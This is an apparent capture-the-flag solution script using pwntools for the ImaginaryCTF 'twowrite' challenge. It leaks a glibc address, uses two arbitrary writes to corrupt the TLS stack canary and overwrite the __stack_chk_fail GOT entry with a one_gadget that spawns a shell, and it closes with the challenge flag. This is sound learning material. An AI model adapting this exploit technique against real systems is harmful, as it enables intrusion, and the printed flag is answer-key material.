from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./vuln_patched', '''
    b *0x4012b3
    b *0x4012e7
    continue
''')

# p = remote('twowrite.chal.imaginaryctf.org', 1337)

# 1. get glibc base address and tls base address
glibc_e = ELF('./libc.so.6')
p.recvuntil(b"system @ ")
glibc_base_addr = int(p.recvline().strip(), 16)-glibc_e.sym.system
log.info(f"glibc base address: {hex(glibc_base_addr)}")
tls_base_addr = glibc_base_addr-0x28c0

# 2. two arbitary writes to trigger one gadget
stack_chk_fail_got = 0x404000
'''
0xf72d2 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
'''
one_gadget_off = 0xf72d2
p.sendlineafter(b"what? ", str(glibc_base_addr+one_gadget_off).encode())
p.sendlineafter(b"what? ", str(0xdeadbeefdeadbeef).encode())
p.sendlineafter(b"where? ", str(hex(tls_base_addr+0x20)).removeprefix('0x').encode())
p.sendlineafter(b"where? ", str(hex(stack_chk_fail_got)).removeprefix('0x').encode())
# write glibc_base_addr+one_gadget_off to tls_base_addr+0x20 and 0xdeadbeefdeadbeef to tls_base_addr+0x20+8
# write glibc_base_addr+one_gadget_off to stack_chk_fail_got and 0xdeadbeefdeadbeef to stack_chk_fail_got+8
# with canary value polluted in tls structure, once program checks canary, program will call __stack_chk_fail()
# with GOT table entry of __stack_chk_fail modified to one gadget, __stack_chk_fail() will trigger one gadget

p.interactive()

# ictf{d0nt_y0u_l0ve_it_when_the_p0inters_demangle_themselves_77a90021e9a8a690}